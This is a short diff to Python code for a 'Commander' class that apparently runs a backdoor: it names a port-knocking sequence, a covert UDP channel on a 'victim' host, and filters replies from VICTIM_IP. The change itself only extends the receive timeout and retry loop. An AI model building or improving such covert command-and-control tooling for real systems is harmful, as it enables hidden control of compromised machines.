@@ -12,7 +12,7 @@ KNOCK_SEQUENCE = [12345, 23456, 34567]  # Port knocking sequence (example)
 COVERT_UDP_PORT = 40000  # The UDP port on a victim used for a covert channel
 
 # Timeouts
-RECV_TIMEOUT = 5.0  # seconds to wait for a response from a victim
+RECV_TIMEOUT = 60.0  # seconds to wait for a response from a victim
 
 
 def get_local_ip(dest_ip, dest_port):
@@ -140,8 +140,11 @@ class Commander:
             try:
                 packet, addr = self.sock.recvfrom(65535)
             except socket.timeout:
-                # Timed out waiting for response
-                return None  # indicate no response
+                if length is None:
+                    return None
+                if time.time() - start_time > RECV_TIMEOUT:
+                    return None
+                continue
             # We only want packets from victim and protocol UDP
             if addr[0] != VICTIM_IP:
                 continue
